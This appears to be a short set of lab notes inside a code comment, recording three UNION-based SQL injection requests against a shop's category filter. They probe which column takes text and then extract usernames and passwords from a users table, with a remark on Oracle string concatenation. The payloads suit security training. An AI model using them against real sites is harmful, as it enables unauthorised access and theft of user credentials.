/*

1) GET /filter?category=Lifestyle'+UNION+SELECT+'abc',NULL+FROM+users-- HTTP/2
//error

2) GET /filter?category=Lifestyle'+UNION+SELECT+NULL,'abc'+FROM+users-- HTTP/2
//works

3) GET /filter?category=Lifestyle'+UNION+SELECT+NULL,username||'*'||password+FROM+users-- HTTP/2
//doubble pipe symbol is for concatenating in oracle query

*/